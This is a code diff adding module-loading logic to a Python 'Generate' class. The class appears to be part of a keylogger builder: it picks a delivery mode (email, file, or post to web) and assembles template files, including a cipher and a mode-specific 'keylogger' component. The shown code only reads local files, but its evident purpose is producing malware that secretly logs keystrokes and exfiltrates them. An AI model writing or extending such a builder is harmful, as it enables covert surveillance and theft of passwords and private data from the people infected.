@@ -99,9 +99,28 @@ class FileNames:
     _5_post = os.path.join(modules, "5.start.post.py") 
         
 class Generate:
-    def __init__(self) -> None:
-        pass
+    def __init__(self, mode: int) -> None:
+        """
+        `mode` -->
+            Values:
+                1 -> Email
+                2 -> File
+                3 -> Post to Web
+        """
+        self.mode = mode
     
     def loadModules(self):
-        pass
+        with open(FileNames._1_imports, "r", encoding='utf-8') as _file:
+            self._1_imports = _file.read()
+        with open(FileNames._2_cipher, "r", encoding='utf-8') as _file:
+            self._2_cipher = _file.read()
+        if self.mode == 1:
+            with open(FileNames._3_email, "r", encoding='utf-8') as _file:
+                self._3_keylogger = _file.read()
+        elif self.mode == 2:
+            with open(FileNames._3_file, "r", encoding='utf-8') as _file:
+                self._3_keylogger = _file.read()
+        else:
+            with open(FileNames._3_post, "r", encoding='utf-8') as _file:
+                self._3_keylogger = _file.read()
     
